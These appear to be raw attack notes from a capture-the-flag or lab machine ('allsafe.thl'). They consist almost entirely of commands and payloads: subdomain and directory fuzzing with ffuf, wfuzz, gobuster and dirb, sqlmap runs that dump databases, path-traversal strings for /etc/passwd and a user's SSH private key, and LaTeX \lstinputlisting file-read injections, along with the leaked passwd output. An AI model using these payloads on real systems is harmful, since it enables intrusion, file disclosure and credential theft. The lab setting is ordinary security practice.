ffuf -u http://allsafe.thl -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.allsafe.thl" -mc all -fw 125



└─$ wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.allsafe.thl" -u 192.168.56.104


wfuzz -c --hc=404,200 --hl=1 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.Patata-Magica" -u 192.168.56.106

dirb http://192.168.56.106/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt



gobuster dir -u http://intranet.allsafe.thl -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt



Firmas
Por el Cliente: Por el Proveedor:
Nombre: test Nombre: Oliver Parker
Empresa:
r o o t : x : 0 : 0 : r o o t : / r o o t : / b in / bash
daemon : x : 1 : 1 : daemon : / u s r / s b i n : / u s r / s b i n / n o l o g i n
b i n : x : 2 : 2 : bin : / bi n : / u s r / s b i n / n o l o g i n
s y s : x : 3 : 3 : s y s : / dev : / u s r / s b i n / n o l o g i n
sync : x : 4 : 6 5 5 3 4 : sync : / bin : / bin / sync
games : x : 5 : 6 0 : games : / u s r / games : / u s r / s b i n / n o l o g i n
man : x : 6 : 1 2 : man : / var / cache /man : / u s r / s b i n / n o l o g i n
l p : x : 7 : 7 : l p : / var / s p o o l / lpd : / u s r / s b i n / n o l o g i n
m ai l : x : 8 : 8 : mail : / var / mail : / u s r / s b i n / n o l o g i n
news : x : 9 : 9 : news : / var / s p o o l / news : / u s r / s b i n / n o l o g i n
uucp : x : 1 0 : 1 0 : uucp : / var / s p o o l / uucp : / u s r / s b i n / n o l o g i n
proxy : x : 1 3 : 1 3 : proxy : / bin : / u s r / s b i n / n o l o g i n
www−data : x : 3 3 : 3 3 :www−data : / var /www: / u s r / s b i n / n o l o g i n
backup : x : 3 4 : 3 4 : backup : / var / backups : / u s r / s b i n / n o l o g i n
l i s t : x : 3 8 : 3 8 : M a i l i n g L i s t Manager : / var / l i s t : / u s r / s b i n / n o l o g i n
i r c : x : 3 9 : 3 9 : i r c d : / run / i r c d : / u s r / s b i n / n o l o g i n
_apt : x : 4 2 : 6 5 5 3 4 : : / n o n e x i s t e n t : / u s r / s b i n / n o l o g i n
nobody : x : 6 5 5 3 4 : 6 5 5 3 4 : nobody : / n o n e x i s t e n t : / u s r / s b i n / n o l o g i n
systemd−network : x : 9 9 8 : 9 9 8 : systemd Network Management : / : / u s r / s b i n / n o l o g i n
sshd : x : 9 9 7 : 6 5 5 3 4 : sshd u s e r : / run / sshd : / u s r / s b i n / n o l o g i n
goddard : x : 1 0 0 0 : 1 0 0 0 : : / home/ goddard : / bin / bash
p a r k e r : x : 1 0 0 1 : 1 0 0 1 : : / home/ p a r k e r : / b in / bash



http://intranet.allsafe.thl/login.php


sqlmap -u "http://intranet.allsafe.thl/" --data='{"username":"admin","password":"admin"}' --headers="Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs --tables --dump



sqlmap -u "http://intranet.allsafe.thl/"  --form --dbs

../../../../../../../../../../../../etc/passwd



cat ../../../../../../../../home/parker/.ssh/id_rsa




\lstinputlisting{/etc/passwd}

\lstinputlisting{/etc/passwd}

$\lstinputlisting{/etc/passwd}$

\@writefile{lol}{\contentsline {lstlisting}{/etc/passwd}{1}{lstlisting.-1}\protected@file@percent }
\@writefile{lol}{\contentsline {lstlisting}{/etc/passwd}{3}{lstlisting.-2}\protected@file@percent }


\lstinputlisting{/etc/passwd}
\lstinputlisting{/etc/passwd}